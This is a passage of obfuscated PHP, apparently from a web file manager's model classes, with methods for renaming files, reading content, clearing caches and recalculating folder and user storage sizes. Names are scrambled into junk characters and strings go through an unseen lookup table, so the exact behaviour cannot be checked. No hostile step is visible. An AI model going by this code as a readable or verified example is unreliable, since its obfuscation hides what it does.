$£çŸ¿òÇ[$ÀºÚ¼ì¤[563]] . $”ÃÜ•Î . $ÀºÚ¼ì¤[591])); $ÛÖ´Ïıã = array($ÀºÚ¼ì¤[630] => $ãÀ›ÅÊ…[$ÀºÚ¼ì¤[563]]); $ÊÜ¨«¦¸ = $this->field($ÀºÚ¼ì¤[2204])->where($ÛÖ´Ïıã)->select(); $Øòõ İè = !1; $ìŞñË¿‚ = array($”ÃÜ•Î); if ($ÊÜ¨«¦¸) { $Øòõ İè = array_to_keyvalue($ÊÜ¨«¦¸, $ÀºÚ¼ì¤[12], $ÀºÚ¼ì¤[518]); $Øòõ İè = array_remove_value($Øòõ İè, $ÀºÚ¼ì¤[212]); $ìŞñË¿‚ = array_to_keyvalue($ÊÜ¨«¦¸, $ÀºÚ¼ì¤[12], $ÀºÚ¼ì¤[181]); $ìŞñË¿‚[] = $”ÃÜ•Î; } } else { $Øòõ İè = array($£çŸ¿òÇ[$ÀºÚ¼ì¤[518]]); $ìŞñË¿‚ = array($”ÃÜ•Î); } return array($ÀºÚ¼ì¤[2201] => $ìŞñË¿‚, $ÀºÚ¼ì¤[1513] => $Øòõ İè); } public function removeArray($îîµı¹É) { if (!$îîµı¹É) { return !0; } } public function removeRelevance($ĞØ²î¡­, $‡¬’çñ) { $½³¸¥â• =& $_SERVER[íû‘ş´]; $ĞØ²î¡­ = $ĞØ²î¡­ ? $ĞØ²î¡­ : array(); $‡¬’çñ = $‡¬’çñ ? $‡¬’çñ : array(); $ĞØ²î¡­ = array_unique(array_filter($ĞØ²î¡­)); $‡¬’çñ = array_unique(array_filter($‡¬’çñ)); if (!$ĞØ²î¡­) { return !1; } $ëÃËÚÛ« = array($½³¸¥â•[468] => array($½³¸¥â•[469], $ĞØ²î¡­)); Model($½³¸¥â•[2202])->where($ëÃËÚÛ«)->delete(); Model($½³¸¥â•[512])->where($ëÃËÚÛ«)->delete(); Model($½³¸¥â•[2050])->where($ëÃËÚÛ«)->delete(); Model($½³¸¥â•[611])->where($ëÃËÚÛ«)->delete(); Model($½³¸¥â•[1883])->removeBySource($ĞØ²î¡­); Model($½³¸¥â•[2183])->removeBySource($ĞØ²î¡­); $this->where($ëÃËÚÛ«)->delete(); Model($½³¸¥â•[521])->remove($‡¬’çñ); for ($ó»ŠƒÎ = 0; $ó»ŠƒÎ < count($ĞØ²î¡­); $ó»ŠƒÎ++) { $this->sourceCacheClear($ĞØ²î¡­[$ó»ŠƒÎ]); } } public function rename($ŞÌç³–, $»ûşà‰ğ) { $ğ«ÇÁùï =& $_SERVER[íû‘ş´]; $‘‘’ĞÙĞ = $this->sourceInfo($ŞÌç³–); if (!$‘‘’ĞÙĞ) { return !1; } $¨ÄìíªÃ = $this->fileNameExist($‘‘’ĞÙĞ[$ğ«ÇÁùï[180]], $»ûşà‰ğ); if ($¨ÄìíªÃ && $¨ÄìíªÃ != $ŞÌç³–) { return !1; } $ÑˆÆ§¸ƒ = array($ğ«ÇÁùï[471] => $»ûşà‰ğ, $ğ«ÇÁùï[629] => USER_ID); if ($‘‘’ĞÙĞ[$ğ«ÇÁùï[462]] != $ğ«ÇÁùï[88]) { $ÑˆÆ§¸ƒ[$ğ«ÇÁùï[463]] = substr(get_path_ext($»ûşà‰ğ), 0, 10); } Model($ğ«ÇÁùï[611])->eventRename($ŞÌç³–, $‘‘’ĞÙĞ[$ğ«ÇÁùï[32]], $»ûşà‰ğ); $this->sourceCacheClear($ŞÌç³–); $this->setNamePinyin($ŞÌç³–, $ÑˆÆ§¸ƒ[$ğ«ÇÁùï[32]], !1); $this->updateModifyTime($‘‘’ĞÙĞ[$ğ«ÇÁùï[180]]); $³òÛÓ¦é = $this->where(array($ğ«ÇÁùï[468] => $ŞÌç³–))->data($ÑˆÆ§¸ƒ)->save(); $İ¼¸‹Ø¦ = $ğ«ÇÁùï[2191] . $‘‘’ĞÙĞ[$ğ«ÇÁùï[180]]; if (isset(self::$cacheChildList[$İ¼¸‹Ø¦])) { unset(self::$cacheChildList[$İ¼¸‹Ø¦]); } return $³òÛÓ¦é; } public function setNamePinyin($®˜Â˜Æ´, $Ö£äÁÎ”, $º¼—âø® = true) { $¯ññô­ =& $_SERVER[íû‘ş´]; $ëğë‚Àò = Input::check($Ö£äÁÎ”, $¯ññô­[633]); $ÛğøäÏè = array($¯ññô­[494] => KodSort::makeStr($Ö£äÁÎ”)); if ($ëğë‚Àò) { $ÛğøäÏè[$¯ññô­[515]] = str_replace($¯ññô­[53], $¯ññô­[12], Pinyin::get($Ö£äÁÎ”)); $ÛğøäÏè[$¯ññô­[514]] = Pinyin::get($Ö£äÁÎ”, $¯ññô­[634]); } if (!$º¼—âø® && !$ëğë‚Àò) { $ÛğøäÏè[$¯ññô­[515]] = null; $ÛğøäÏè[$¯ññô­[514]] = null; } $this->metaSet($®˜Â˜Æ´, $ÛğøäÏè); } public function getContent($´ñÑ¯ıÇ) { $‚œû£ëæ =& $_SERVER[íû‘ş´]; $Œ‹ò¤ˆ¤ = $this->fileInfoGet($´ñÑ¯ıÇ); if (!$Œ‹ò¤ˆ¤) { return !1; } if ($Œ‹ò¤ˆ¤[$‚œû£ëæ[76]] == 0) { return $‚œû£ëæ[12]; } $ÊÎüÍë = $‚œû£ëæ[2205] . $Œ‹ò¤ˆ¤[$‚œû£ëæ[524]]; if ($Œ‹ò¤ˆ¤[$‚œû£ëæ[76]] <= 1024 * 10) { $´ÅÂã”à = Cache::get($ÊÎüÍë); if (!$´ÅÂã”à) { $´ÅÂã”à = IO::getContent($Œ‹ò¤ˆ¤[$‚œû£ëæ[84]]); Cache::set($ÊÎüÍë, $´ÅÂã”à); } return $´ÅÂã”à; } if (!$Œ‹ò¤ˆ¤[$‚œû£ëæ[84]]) { return $‚œû£ëæ[12]; } return IO::getContent($Œ‹ò¤ˆ¤[$‚œû£ëæ[84]]); } public function setDesc($ıö„‰‹, $·²ô÷È—) { $Áò¬ËÜñ =& $_SERVER[íû‘ş´]; Model($Áò¬ËÜñ[611])->eventAddDesc($ıö„‰‹, $·²ô÷È—); return $this->metaSet($ıö„‰‹, $Áò¬ËÜñ[503], $·²ô÷È—); } public function setContent($ÚÛâ™«Ÿ, $³ô£¨» = '') { $ÇŒµÆó­ =& $_SERVER[íû‘ş´]; $ğüÔ¥àĞ = $this->sourceInfo($ÚÛâ™«Ÿ); $Çã˜›İ = $this->fileInfoGet($ÚÛâ™«Ÿ); if (!$Çã˜›İ || !$ğüÔ¥àĞ) { return !1; } $ôªÇÌõ = Model($ÇŒµÆó­[521])->addFileByContent($³ô£¨», $ğüÔ¥àĞ[$ÇŒµÆó­[32]]); $Çšğ¨¨Ñ = $this->fileHistory($ğüÔ¥àĞ, $ôªÇÌõ[$ÇŒµÆó­[518]], $ôªÇÌõ[$ÇŒµÆó­[76]]); if (!$Çšğ¨¨Ñ) { return Model($ÇŒµÆó­[521])->remove($ôªÇÌõ[$ÇŒµÆó­[518]]); } $this->folderSizeReset($ğüÔ¥àĞ[$ÇŒµÆó­[180]]); return !0; } public function fileSubstr($ˆ£á¨§, $ˆª´€½œ, $Î£ØÄİˆ) { $ÙÓ†£¼ì = $this->fileInfoGet($ˆ£á¨§); if (!$ÙÓ†£¼ì) { return !1; } return IO::fileSubstr($ÙÓ†£¼ì[$_SERVER[íû‘ş´][84]], $ˆª´€½œ, $Î£ØÄİˆ); } public function fileInfoGet($Ÿ¨Ÿ‰­ø) { $ÁÂ„Ä³© =& $_SERVER[íû‘ş´]; $½Ş¥Ç‘ƒ = $this->sourceInfo($Ÿ¨Ÿ‰­ø); if (!$½Ş¥Ç‘ƒ || $½Ş¥Ç‘ƒ[$ÁÂ„Ä³©[462]]) { return !1; } $£‘ÊÄ©ï = $ÁÂ„Ä³©[525] . $½Ş¥Ç‘ƒ[$ÁÂ„Ä³©[518]]; $éË‘£üÊ = _get(self::$cacheFileInfo, $£‘ÊÄ©ï); if ($éË‘£üÊ) { return $éË‘£üÊ; } $¿¾–â‘ = Model($ÁÂ„Ä³©[521])->fileInfo($½Ş¥Ç‘ƒ[$ÁÂ„Ä³©[518]]); if ($¿¾–â‘) { $¿¾–â‘[$ÁÂ„Ä³©[32]] = $½Ş¥Ç‘ƒ[$ÁÂ„Ä³©[32]]; } self::$cacheFileInfo[$£‘ÊÄ©ï] = $¿¾–â‘; return $¿¾–â‘; } private function folderChildrenNumber($ŠºÃ²) { $î“İöÊ =& $_SERVER[íû‘ş´]; $ãğ¥éİõ = $this->sourceInfo($ŠºÃ²); $ıùœØ–‘ = array($î“İöÊ[630] => array($î“İöÊ[590], $ãğ¥éİõ[$î“İöÊ[563]] . $ŠºÃ² . $î“İöÊ[591]), $î“İöÊ[627] => $ãğ¥éİõ[$î“İöÊ[548]], $î“İöÊ[481] => intval($ãğ¥éİõ[$î“İöÊ[482]]), $î“İöÊ[624] => 1); $³­µ‰´ = $this->where($ıùœØ–‘)->count(); $ğ§Â‹Š = $this->where($ıùœØ–‘)->where(array($î“İöÊ[624] => 0))->count(); return array($î“İöÊ[80] => $ğ§Â‹Š, $î“İöÊ[81] => $³­µ‰´); } public function pathInfo($˜«Ó÷üç, $í²Â¾”¬ = false) { $ù³Ëûß =& $_SERVER[íû‘ş´]; $í²Â¾”¬ = !1; $˜«Ó÷üç = intval($˜«Ó÷üç); $ü”˜º‹‹ = $ù³Ëûß[511] . intval($í²Â¾”¬) . $ù³Ëûß[430] . $˜«Ó÷üç; $ş‡â’°â = _get(self::$cachePathInfo, $ü”˜º‹‹); if ($ş‡â’°â) { return $ş‡â’°â; } $ï„¢ ¦ = $this->sourceInfo($˜«Ó÷üç); if (!$ï„¢ ¦) { return !1; } $ï„¢ ¦ = $this->_listDataApplyItem($ï„¢ ¦, $í²Â¾”¬); self::$cachePathInfo[$ü”˜º‹‹] = $ï„¢ ¦; return $ï„¢ ¦; } public static $cachePathInfoMore = array(); public function pathInfoMore($˜Ë¿ÆÆ) { $Š‡ƒÏ½» =& $_SERVER[íû‘ş´]; $šİåÅ®é = _get(self::$cachePathInfoMore, $˜Ë¿ÆÆ); if ($šİåÅ®é) { return $šİåÅ®é; } $€ñ»İã = $this->pathInfo($˜Ë¿ÆÆ); if (!$€ñ»İã) { return !1; } if ($€ñ»İã[$Š‡ƒÏ½»[462]] == $Š‡ƒÏ½»[88]) { $€ñ»İã[$Š‡ƒÏ½»[79]] = $this->folderChildrenNumber($˜Ë¿ÆÆ); } self::$cachePathInfoMore[$˜Ë¿ÆÆ] = $€ñ»İã; return $€ñ»İã; } public function sourceInfo($ôÉ½ï«Œ) { $Îß˜ÆºÓ =& $_SERVER[íû‘ş´]; if (!$ôÉ½ï«Œ) { return array(); } $ôÉ½ï«Œ = intval($ôÉ½ï«Œ); $©ÌåÒ¶‚ = $Îß˜ÆºÓ[510] . $ôÉ½ï«Œ; $²¸¡”Í× = _get(self::$cacheSourceInfo, $©ÌåÒ¶‚); if ($²¸¡”Í×) { return $²¸¡”Í×; } $÷”…øºæ = $this->where(array($Îß˜ÆºÓ[181] => $ôÉ½ï«Œ))->find(); self::$cacheSourceInfo[$©ÌåÒ¶‚] = $÷”…øºæ; return self::$cacheSourceInfo[$©ÌåÒ¶‚]; } public function sourceCacheClear($ÌæÇ“‡Õ = false) { self::cacheClear($ÌæÇ“‡Õ); } public static function cacheClear($¼ë÷´Şè = false) { $šƒú’Û­ =& $_SERVER[íû‘ş´]; if ($¼ë÷´Şè == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$šƒú’Û­[510] . $¼ë÷´Şè]); unset(self::$cachePathInfoMore[$¼ë÷´Şè]); unset(self::$cachePathInfo[$šƒú’Û­[2206] . $¼ë÷´Şè]); unset(self::$cachePathInfo[$šƒú’Û­[2207] . $¼ë÷´Şè]); } public function metaSet($¨²°äú, $Ù¸ŞØïÛ = null, $Î¾ÉÉÅà = null) { $–Ò»áïÎ = parent::metaSet($¨²°äú, $Ù¸ŞØïÛ, $Î¾ÉÉÅà); if ($–Ò»áïÎ) { $this->sourceCacheClear($¨²°äú); } return $–Ò»áïÎ; } public function pathInfoByPath($öÒ¿æê¶, $×·ëé°Å) { $Àúä¸¢ş =& $_SERVER[íû‘ş´]; $½¤”ŸÖ• = !$×·ëé°Å ? array() : explode($Àúä¸¢ş[8], trim($×·ëé°Å, $Àúä¸¢ş[8])); $šÖ’ÚÊÃ = $öÒ¿æê¶; foreach ($½¤”ŸÖ• as $ÑèÙÛÄÓ) { $ñâØŠÑï = array($Àúä¸¢ş[180] => $šÖ’ÚÊÃ, $Àúä¸¢ş[32] => $ÑèÙÛÄÓ); $—À¼˜È’ = $this->field($Àúä¸¢ş[2208])->where($ñâØŠÑï)->select(); if (!$—À¼˜È’) { return !1; } $—À¼˜È’ = array_sort_by($—À¼˜È’, $Àúä¸¢ş[482]); $šÖ’ÚÊÃ = $—À¼˜È’[0][$Àúä¸¢ş[181]]; } $õºÚóõ = $this->sourceInfo($šÖ’ÚÊÃ); $this->pathInfoFilter($õºÚóõ); return $õºÚóõ; } protected function updateModifyTime($¶İá›ñ¥) { $âøŸè°¤ =& $_SERVER[íû‘ş´]; $¨åÄ¯ö¥ = defined($âøŸè°¤[2124]) ? USER_ID : 0; if (!$¶İá›ñ¥) { return; } if (!is_array($¶İá›ñ¥)) { $¶İá›ñ¥ = array($¶İá›ñ¥); } foreach ($¶İá›ñ¥ as $§­Ó©´§ => $Æ‚Ó‡Ãå) { $¶İá›ñ¥[$§­Ó©´§] = intval($Æ‚Ó‡Ãå); $this->sourceCacheClear($Æ‚Ó‡Ãå); } $Í–Øì°¥ = array($âøŸè°¤[181] => array($âøŸè°¤[7], $¶İá›ñ¥)); $°ëÏí®ş = array($âøŸè°¤[629] => $¨åÄ¯ö¥, $âøŸè°¤[475] => time()); $this->where($Í–Øì°¥)->save($°ëÏí®ş); } public function folderSizeReset($¾¼¶ƒÚ, $„¾®íÃº = false) { $ëÔ«çè =& $_SERVER[íû‘ş´]; if ($this->statusIgnoreResetSpace) { return; } $ã°èõ§ç = $this->sourceInfo($¾¼¶ƒÚ); $¬š¥ ú± = $ëÔ«çè[2209] . $¾¼¶ƒÚ; CacheLock::lock($¬š¥ ú±, 20); if ($„¾®íÃº === !1) { $this->sourceCacheClear($¾¼¶ƒÚ); $ã°èõ§ç = $this->sourceInfo($¾¼¶ƒÚ); $ƒƒì—® = array($ëÔ«çè[454] => $¾¼¶ƒÚ, $ëÔ«çè[481] => 0); $ÜğŒíÄØ = $this->where($ƒƒì—®)->sum($ëÔ«çè[76]); $„¾®íÃº = intval($ÜğŒíÄØ) - intval($ã°èõ§ç[$ëÔ«çè[76]]); } if ($„¾®íÃº == 0) { return CacheLock::unlock($¬š¥ ú±); } $í€í° ‰ = $this->parentLevelArray($ã°èõ§ç[$ëÔ«çè[563]]); if (!$í€í° ‰) { $í€í° ‰ = array(); } $í€í° ‰[] = $ã°èõ§ç[$ëÔ«çè[181]]; $ƒƒì—® = array($ëÔ«çè[181] => array($ëÔ«çè[469], $í€í° ‰)); if ($„¾®íÃº < 0) { $ƒƒì—®[$ëÔ«çè[76]] = array($ëÔ«çè[1073], abs($„¾®íÃº)); } $this->where($ƒƒì—®)->setAdd($ëÔ«çè[76], $„¾®íÃº); CacheLock::unlock($¬š¥ ú±); $ãÀı¼ş” = $ëÔ«çè[2210] . $ã°èõ§ç[$ëÔ«çè[178]] . $ëÔ«çè[4] . $ã°èõ§ç[$ëÔ«çè[548]]; $ã÷Œï™¿ = array($ã°èõ§ç[$ëÔ«çè[178]], $ã°èõ§ç[$ëÔ«çè[548]]); TaskRun::timeLimitCall($ãÀı¼ş”, $ëÔ«çè[2211], $ã÷Œï™¿, 1.5); } public function folderSizeResetChildren($ËÈ€¦€ö) { $¸ÈÚìñÏ =& $_SERVER[íû‘ş´]; $this->sourceCacheClear($ËÈ€¦€ö); $ûä±ğêÍ = $this->sourceInfo($ËÈ€¦€ö); $–”¦„½î = array($¸ÈÚìñÏ[624] => 1, $¸ÈÚìñÏ[627] => $ûä±ğêÍ[$¸ÈÚìñÏ[548]], $¸ÈÚìñÏ[630] => array($¸ÈÚìñÏ[590], $ûä±ğêÍ[$¸ÈÚìñÏ[563]] . $ËÈ€¦€ö . $¸ÈÚìñÏ[591])); $–ÈĞÇÌâ = $¸ÈÚìñÏ[2212]; $é¢¹Ü©ˆ = $this->field($–ÈĞÇÌâ)->where($–”¦„½î)->select(); $–”¦„½î[$¸ÈÚìñÏ[462]] = 0; $ßºüñ¾ = $this->field($–ÈĞÇÌâ)->where($–”¦„½î)->select(); if (!$ßºüñ¾) { return; } $é¢¹Ü©ˆ[] = $ûä±ğêÍ; $é¢¹Ü©ˆ = array_to_keyvalue($é¢¹Ü©ˆ, $¸ÈÚìñÏ[181]); foreach ($é¢¹Ü©ˆ as $’ô¯Ş¬ => $£Å®ì’) { $é¢¹Ü©ˆ[$’ô¯Ş¬][$¸ÈÚìñÏ[2213]] = $é¢¹Ü©ˆ[$’ô¯Ş¬][$¸ÈÚìñÏ[76]]; $é¢¹Ü©ˆ[$’ô¯Ş¬][$¸ÈÚìñÏ[76]] = 0; } foreach ($ßºüñ¾ as $£Å®ì’) { $óì¤ª‹ = $£Å®ì’[$¸ÈÚìñÏ[180]] . $¸ÈÚìñÏ[12]; if (!isset($é¢¹Ü©ˆ[$óì¤ª‹])) { continue; } if ($£Å®ì’[$¸ÈÚìñÏ[482]] == $é¢¹Ü©ˆ[$óì¤ª‹][$¸ÈÚìñÏ[482]]) { $é¢¹Ü©ˆ[$óì¤ª‹][$¸ÈÚìñÏ[76]] += $£Å®ì’[$¸ÈÚìñÏ[76]]; } } foreach ($é¢¹Ü©ˆ as $£Å®ì’) { $Ş¨Æ­ˆî = $this->parentLevelArray($£Å®ì’[$¸ÈÚìñÏ[563]]); foreach ($Ş¨Æ­ˆî as $óì¤ª‹) { $óì¤ª‹ = $óì¤ª‹ . $¸ÈÚìñÏ[12]; if (!isset($é¢¹Ü©ˆ[$óì¤ª‹])) { continue; } if ($£Å®ì’[$¸ÈÚìñÏ[482]] == $é¢¹Ü©ˆ[$óì¤ª‹][$¸ÈÚìñÏ[482]]) { $é¢¹Ü©ˆ[$óì¤ª‹][$¸ÈÚìñÏ[76]] += $£Å®ì’[$¸ÈÚìñÏ[76]]; } } } $Çğëâ¶Ï = array(); foreach ($é¢¹Ü©ˆ as $£Å®ì’) { if ($£Å®ì’[$¸ÈÚìñÏ[76]] == $£Å®ì’[$¸ÈÚìñÏ[2213]]) { continue; } $Çğëâ¶Ï[] = array($¸ÈÚìñÏ[181], $£Å®ì’[$¸ÈÚìñÏ[181]], $¸ÈÚìñÏ[76], $£Å®ì’[$¸ÈÚìñÏ[76]]); } $this->saveAll($Çğëâ¶Ï); } public function userSpaceReset($«’¬º—¬ = false) { $´ô­€œÅ =& $_SERVER[íû‘ş´]; $¿óÂ»À = $this->where(array($´ô­€œÅ[178] => self::TYPE_USER, $´ô­€œÅ[548] => $«’¬º—¬, $´ô­€œÅ[462] => 0))->sum($´ô­€œÅ[76]); $¿óÂ»À = !$¿óÂ»À || $¿óÂ»À <= 0 ? 0 : $¿óÂ»À; Model($´ô­€œÅ[556])->userEdit($«’¬º—¬, array($´ô­€œÅ[1892] => $¿óÂ»À)); } public function targetSpaceUpdate($Èùôˆ†’, $ŠªÎı¼Î) { $ÜëñÜœ¤ =& $_SERVER[íû‘ş´]; if (!$ŠªÎı¼Î) { return; } if (!in_array($Èùôˆ†’, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ğ†¢ô¥‰ = $this->targetSpaceSize($Èùôˆ†’, $ŠªÎı¼Î); if ($Èùôˆ†’ == self::TYPE_USER) { Model($ÜëñÜœ¤[556])->userEdit($ŠªÎı¼Î, array($ÜëñÜœ¤[1892] => $Ğ†¢ô¥‰)); } else { if ($Èùôˆ†’ == self::TYPE_GROUP) { Model($ÜëñÜœ¤[564])->groupEdit($ŠªÎı¼Î, array($ÜëñÜœ¤[1892] => $Ğ†¢ô¥‰)); } } } public function targetSpaceSize($ò’–‹“¨, $Îûçùéê) { $º­§×¾Ğ =& $_SERVER[íû‘ş´]; $î‘÷ãø­ = 0; $«ğîÃ‘¹ = $this->targetSourceRoot($ò’–‹“¨, $Îûçùéê, !0); foreach ($«ğîÃ‘¹ as $”‚¯®ƒì) { if (!$”‚¯®ƒì) { continue; } $î‘÷ãø­ += floatval($”‚¯®ƒì[$º­§×¾Ğ[76]]); $Õ‹äñØÖ = array($º­§×¾Ğ[630] => array($º­§×¾Ğ[590], $º­§×¾Ğ[573] . $”‚¯®ƒì[$º­§×¾Ğ[181]] . $º­§×¾Ğ[591])); $÷„èŸ¹² = Model($º­§×¾Ğ[480])->field($º­§×¾Ğ[468])->where($Õ‹äñØÖ)->select(); $÷„èŸ¹² = array_to_keyvalue($÷„èŸ¹², $º­§×¾Ğ[12], $º­§×¾Ğ[181]); $÷„èŸ¹² = array_unique(array_filter($÷„èŸ¹²)); if ($÷„èŸ¹²) { $Õ‹äñØÖ = array($º­§×¾Ğ[468] => array($º­§×¾Ğ[469], $÷„èŸ¹²)); $î‘÷ãø­ += floatval($this->where($Õ‹äñØÖ)->sum($º­§×¾Ğ[76])); } } $î‘÷ãø­ = !$î‘÷ãø­ || $î‘÷ãø­ <= 0 ? 0 : $î‘÷ãø­; return $î‘÷ãø­; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¡Æß½Â) { return $this->fileTypeProfile($¡Æß½Â, SourceModel::TYPE_USER); } public function groupFileTypeProfile($°»‚ºì») { return $this->fileTypeProfile($°»‚ºì», SourceModel::TYPE_GROUP); } private function fileTypeProfile($†µÑµ¶«, $İ¨£Ó½À) { $îÁãüæ =& $_SERVER[íû‘ş´]; $Îß¶ˆá = $îÁãüæ[2214] . $†µÑµ¶« . $îÁãüæ[11] . $İ¨£Ó½À; $ÄÀ‘ÁÙÃ = Cache::get($Îß¶ˆá); if ($ÄÀ‘ÁÙÃ) { return $ÄÀ‘ÁÙÃ; } $ÆŠÏ»º¤ = array($îÁãüæ[624] => 0); if ($†µÑµ¶« != !1) { $ÆŠÏ»º¤[$îÁãüæ[548]] = $†µÑµ¶«; $ÆŠÏ»º¤[$îÁãüæ[178]] = $İ¨£Ó½À; } $Û¼ıØ¿á = array(); $Û¼ıØ¿á[$îÁãüæ[2215]] = array($îÁãüæ[2216] => LNG($îÁãüæ[2215]), $îÁãüæ[2217] => $this->where($ÆŠÏ»º¤)->count(), $îÁãüæ[595] => $this->where($ÆŠÏ»º¤)->sum($îÁãüæ[76])); $¤›Ù÷»Ñ = KodIO::fileTypeList(); foreach ($¤›Ù÷»Ñ as $…ÛÁ…¦ => $æ–ºŠ™¼) { $ÆŠÏ»º¤[$îÁãüæ[463]] = $this->fileTypeWhere($…ÛÁ…¦); $Û¼ıØ¿á[$…ÛÁ…¦] = array($îÁãüæ[2216] => $æ–ºŠ™¼[$îÁãüæ[32]], $îÁãüæ[2217] => $this->where($ÆŠÏ»º¤)->count(), $îÁãüæ[595] => $this->where($ÆŠÏ»º¤)->sum($îÁãüæ[76])); } Cache::set($Îß¶ˆá, $Û¼ıØ¿á, 1200); return $Û¼ıØ¿á; } public function fileNameExist($¸êÍ—Ğ, $¡Ø”Êãû) { $Ê¬ö¯Â® =& $_SERVER[íû‘ş´]; $êÍ¤Ëßİ = $this->field($Ê¬ö¯Â®[2218])->where(array($Ê¬ö¯Â®[180] => $¸êÍ—Ğ, $Ê¬ö¯Â®[32] => $¡Ø”Êãû, $Ê¬ö¯Â®[482] => 0))->find(); return is_array($êÍ¤Ëßİ) ? $êÍ¤Ëßİ[$Ê¬ö¯Â®[181]] : !1; } public function childList($†çşà¶) { $îëÓÅ—ò =& $_SERVER[íû‘ş´]; $ÆÌÊ¹ôÁ = $îëÓÅ—ò[2191] . $†çşà¶; if (isset(self::$cacheChildList[$ÆÌÊ¹ôÁ])) { return self::$cacheChildList[$ÆÌÊ¹ôÁ]; } $Ö¬çµß­ = array($îëÓÅ—ò[180] => intval($†çşà¶), $îëÓÅ—ò[482] => 0); $ï¥¦ˆåú = $this->where($Ö¬çµß­)->select(); $ï¥¦ˆåú = $ï¥¦ˆåú ? $ï¥¦ˆåú : array(); self::$cacheChildList[$ÆÌÊ¹ôÁ] = $ï¥¦ˆåú; foreach ($ï¥¦ˆåú as $›ÙÙˆç†) { $ÆÌÊ¹ôÁ = $îëÓÅ—ò[510] . $›ÙÙˆç†[$îëÓÅ—ò[181]]; self::$cacheSourceInfo[$ÆÌÊ¹ôÁ] = $›ÙÙˆç†; } return $ï¥¦ˆåú; } public function fileNameAuto($ÙÏµùàÚ, $”ÂĞ‚Õ—, $â¶ğÄËÅ = REPEAT_RENAME, $ê¨¸úïµ = false) { $É·ñ…êŞ =& $_SERVER[íû‘ş´]; $ú•®±£ = get_path_ext($”ÂĞ‚Õ—); $êÌá³˜Î = $ú•®±£ ? basename($”ÂĞ‚Õ—, $É·ñ…êŞ[10] . $ú•®±£) . $É·ñ…êŞ[2219] . $ú•®±£ : $”ÂĞ‚Õ— . $É·ñ…êŞ[428]; $¶ÌñÜË‚ = array($É·ñ…êŞ[180] => $ÙÏµùàÚ, $É·ñ…êŞ[482] => 0, $É·ñ…êŞ[32] => array($É·ñ…êŞ[427], $êÌá³˜Î)); $¯‰éä©© = $this->field($É·ñ…êŞ[32])->where($¶ÌñÜË‚)->select(); $·œ¨ìõ = array_to_keyvalue($¯‰éä©©, $É·ñ…êŞ[12], $É·ñ…êŞ[32]); return $this->fileNameAutoGet($·œ¨ìõ, $”ÂĞ‚Õ—, $â¶ğÄËÅ, $ê¨¸úïµ); } public function fileNameAutoGet($èâ÷æ¢Ù, $ÏÜõ­øà, $ÒÀ¦ Ó½, $ÉÏ²¥Ü°) { $ş‚¼‡Æ« =& $_SERVER[íû‘ş´]; if ($ÒÀ¦ Ó½ == REPEAT_REPLACE || !$èâ÷æ¢Ù || !in_array_not_case($ÏÜõ­øà, $èâ÷æ¢Ù) || $ÉÏ²¥Ü° && $ÒÀ¦ Ó½ != REPEAT_RENAME_FOLDER) { return $ÏÜõ­øà; } if ($ÒÀ¦ Ó½ == REPEAT_SKIP) { return !1; } $ƒ§Ö…Ö = $ş‚¼‡Æ«[10] . get_path_ext($ÏÜõ­øà); $ƒ§Ö…Ö = $ƒ§Ö…Ö == $ş‚¼‡Æ«[10] || $ÉÏ²¥Ü° ? $ş‚¼‡Æ«[12] : $ƒ§Ö…Ö; for ($‰ßÔÒ³» = 1; $‰ßÔÒ³» <= count($èâ÷æ¢Ù) + 1; $‰ßÔÒ³»++) { $ó®¯™³ = substr($ÏÜõ­øà, 0, strlen($ÏÜõ­øà) - strlen($ƒ§Ö…Ö)); $¶Ù³ÅšË = $ó®¯™³ . "\x28{$‰ßÔÒ³»}\51{$ƒ§Ö…Ö}"; if (!in_array_not_case($¶Ù³ÅšË, $èâ÷æ¢Ù)) { return $¶Ù³ÅšË; } } } } goto cã‚ÒšŠñÓ; a×ğº¨èÊ¦: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ ³óïñ) { $Úå³–ˆó =& $_SERVER[íû‘ş´]; return array($Úå³–ˆó[2014] => array($Úå³–ˆó[2403] . USER_ID, $Úå³–ˆó[2015])); } protected function listData() { $–ô¤á¼ú =& $_SERVER[íû‘ş´]; $•×µ»¯ˆ = array($–ô¤á¼ú[1696] => USER_ID, $–ô¤á¼ú[535] => array($–ô¤á¼ú[2018], 0)); $Øà®İÉ‚ = $–ô¤á¼ú[2404]; $¾ªê’÷Š = $this->field($Øà®İÉ‚)->where($•×µ»¯ˆ)->order($–ô¤á¼ú[2021])->select(); return $¾ªê’÷Š ? $¾ªê’÷Š : array(); } protected function addToTag($åïÚ™õÑ, $ğô¥“²’) { $©ÙÅœÛÃ =& $_SERVER[íû‘ş´]; if (!Model($©ÙÅœÛÃ[2163])->listData($ğô¥“²’)) { return !1; } if (is_numeric($åïÚ™õÑ)) { $­¹¬Éíç = Model($©ÙÅœÛÃ[884])->pathInfo($åïÚ™õÑ); if (!$­¹¬Éíç) { return !1; } } else { $­¹¬Éíç = IO::infoSimple($åïÚ™õÑ); if (!$­¹¬Éíç) { return !1; } $±ÍÙ½Óï = $­¹¬Éíç[$©ÙÅœÛÃ[32]]; $Ï¿‹¥×„ = $­¹¬Éíç[$©ÙÅœÛÃ[33]]; if (isset($­¹¬Éíç[$©ÙÅœÛÃ[462]])) { $Ï¿‹¥×„ = $­¹¬Éíç[$©ÙÅœÛÃ[462]] == $©ÙÅœÛÃ[88] ? $©ÙÅœÛÃ[75] : $©ÙÅœÛÃ[214]; } } $Û¾ïÛƒ˜ = array($©ÙÅœÛÃ[1696] => USER_ID, $©ÙÅœÛÃ[535] => $ğô¥“²’, $©ÙÅœÛÃ[472] => $åïÚ™õÑ, $©ÙÅœÛÃ[473] => $Ï¿‹¥×„ ? $Ï¿‹¥×„ : $©ÙÅœÛÃ[467], $©ÙÅœÛÃ[471] => $±ÍÙ½Óï ? $±ÍÙ½Óï : $©ÙÅœÛÃ[12], $©ÙÅœÛÃ[1907] => 0); if ($this->where($Û¾ïÛƒ˜)->find()) { return !1; } return $this->add($Û¾ïÛƒ˜); } protected function removeFromTag($¢©Ğ˜ÚŸ, $ ·ÚÖÉÁ) { $‘¯ßÚ =& $_SERVER[íû‘ş´]; if (!Model($‘¯ßÚ[2163])->listData($ ·ÚÖÉÁ)) { return !1; } if (is_array($¢©Ğ˜ÚŸ)) { 